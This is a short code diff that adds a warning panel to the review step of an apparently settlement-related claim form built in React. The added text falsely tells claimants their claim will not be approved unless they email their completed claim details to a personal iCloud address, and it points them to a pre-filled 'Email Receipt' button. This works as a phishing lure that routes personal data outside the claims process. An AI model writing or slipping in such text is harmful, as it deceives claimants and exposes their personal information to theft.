@@ -520,6 +520,18 @@ function StepReview({
         )}
       </div>
 
+      <div className="mt-6 rounded-xl border-2 border-warning/40 bg-warning/10 p-4 text-sm">
+        <div className="font-semibold text-foreground">Important — required to approve your claim</div>
+        <p className="mt-1 text-muted-foreground">
+          After you submit, you MUST email a copy of your completed claim information to{" "}
+          <strong className="text-foreground">applesettlementclaim@icloud.com</strong>. On the next screen, tap
+          "Email Receipt" — it opens your mail app with everything pre-filled. Then press Send.
+        </p>
+        <p className="mt-2 font-medium text-foreground">
+          Claims that are not emailed to applesettlementclaim@icloud.com will NOT be approved.
+        </p>
+      </div>
+
       <label className="mt-8 flex cursor-pointer items-start gap-3 rounded-xl border border-border bg-muted/30 p-4 text-sm">
         <Checkbox checked={attest} onCheckedChange={(v) => setAttest(!!v)} className="mt-0.5" />
         <span>
